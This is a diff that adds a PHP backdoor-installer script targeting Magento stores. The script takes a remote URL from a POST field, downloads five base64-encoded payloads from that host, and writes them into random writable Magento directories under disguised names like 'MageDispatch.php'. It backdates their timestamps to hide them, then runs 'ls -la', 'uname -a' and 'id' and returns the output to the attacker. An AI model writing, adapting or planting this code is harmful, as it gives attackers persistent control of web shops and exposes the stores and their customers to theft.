@@ -1,0 +1,171 @@
+<?php
+
+if (version_compare(phpversion(), '5.3.0', '<') === true) {
+	define('NOPHAR', true);
+}
+
+$hosted_file = base64_decode($_POST['f04c7553b58e9b8d0bfd9f4b96d5d87a']);
+$mage_dir = get_mage_root_dir();
+$dirs_to_scan = array($mage_dir . 'js/', $mage_dir . 'downloader/', $mage_dir . 'errors/', $mage_dir . 'skin/', $mage_dir . 'var/');
+
+$dirs = array();
+$temp = array();
+
+foreach ($dirs_to_scan as $directory)
+	$temp[] = scan_dir($directory, true);
+
+$writable_directories = $temp[4];
+$paths = array_random($writable_directories, 5);
+
+
+$content = array(
+				array('name' => 'asus', 'body' => @file_get_contents($hosted_file . '?asus')),
+				array('name' => 'bird', 'body' => @file_get_contents($hosted_file . '?bird')),
+				array('name' => 'foka', 'body' => @file_get_contents($hosted_file . '?foka')),
+				array('name' => 'phar', 'body' => @file_get_contents($hosted_file . '?phar')),
+				array('name' => 'lolz', 'body' => @file_get_contents($hosted_file . '?lolz'))
+			);
+
+print_r(install_scripts($paths, $content));
+
+
+function scan_dir($directory, $recursive = false)
+{
+	global $dirs;
+
+	$files = scandir($directory);
+
+	foreach ($files as $key) {
+		if ($key == '.' || $key == '..')
+			continue;
+		if (is_dir($directory . $key)) {
+			$rec_dir = $directory . $key . '/';
+			if (is_writable($rec_dir)) {
+				$dirs[] = $rec_dir;
+			}
+			if ($recursive) {
+				scan_dir($rec_dir, true);
+			}
+		}
+	}
+
+	return $dirs;
+}
+
+
+function install_scripts($paths, $content)
+{
+	$info = array();
+	$host = $_SERVER['HTTP_HOST'];
+
+	$first_iteration = true;
+
+	foreach ($paths as $path) {
+		if ($first_iteration) {
+			if (!defined('NOPHAR')) {
+				$phar = true;
+				$name = $content[3]['name'];
+				$body = $content[3]['body'];
+				$first_iteration = false;
+			} else {
+				$name = $content[1]['name'];
+				$body = $content[1]['body'];
+			}
+		}
+
+		if (!isset($name)) {
+			$phar = false;
+			$rand = mt_rand(0, count($content) - 1);
+			$name = $content[$rand]['name'];
+			$body = $content[$rand]['body'];
+		}
+
+		if ($name == 'phar' && defined('NOPHAR')) {
+			$name = $content[1]['name'];
+			$body = $content[1]['body'];
+		}
+
+		$path.= generate_scriptname($phar);
+		$path_wo_name = str_replace(basename($path), '', $path);
+
+		if (is_writable($path_wo_name)) {
+			@file_put_contents($path, base64_decode($body));
+			if (file_exists($path)) {
+				$current_dir_date = @date("Y-m-d H:m:s", @filectime('./'));
+				@touch($path, $current_dir_date);
+				@touch($path_wo_name, $current_dir_date);
+			}
+		}
+
+		$info[$host][][$name] = $path;
+		unset($name);
+	}
+
+	$info[$host][]['sys_info'] = get_some_usefull_data();
+
+	return serialize($info);
+}
+
+
+function generate_scriptname($is_phar = false)
+{
+	$keywords = array('magento', 'mage', 'abstract', 'connect', 'template', 'view', 'dispatch', 'lib', 'app', 'pear', 'zend', 'cache', 'archive', 'exception', 'handler', 'backend', 'frontend', 'html');
+
+	shuffle($keywords);
+
+	$words = array();
+	$keywords = array_map('ucfirst', $keywords);
+	$key = array_rand($keywords, 2);
+
+	if ($keywords[$key[0]] == $keywords[$key[1]])
+		continue;
+
+	$name = $keywords[$key[0]] . $keywords[$key[1]];
+
+	return ($is_phar) ? $name . '.phar.php' : $name . '.php';
+}
+
+
+function array_random($array, $num = 1)
+{
+    shuffle($array);
+
+    $r = array();
+    for ($i = 0; $i < $num; $i++) {
+        $r[] = $array[$i];
+    }
+    return $num == 1 ? $r[0] : $r;
+}
+
+
+function get_some_usefull_data()
+{
+	$disabled = array();
+
+	if (is_callable('ini_get'))
+		$disabled = explode(',', @ini_get('disable_functions'));
+
+	if (in_array('exec', $disabled))
+		return;
+
+	$out = array();
+	$cmds = array('ls -la ../', 'uname -a', 'id');
+	foreach ($cmds as $cmd)
+		@exec($cmd, $out[$cmd]);
+
+	return base64_encode(serialize($out));
+}
+
+
+function get_mage_root_dir()
+{
+	$directory = './';
+
+	for ($i=0; $i<10; $i++) {
+		$directory.= '../';
+		$files = scandir($directory);
+		if (in_array('index.php', $files) && in_array('get.php', $files)) {
+			return $directory;
+		}
+	}
+}
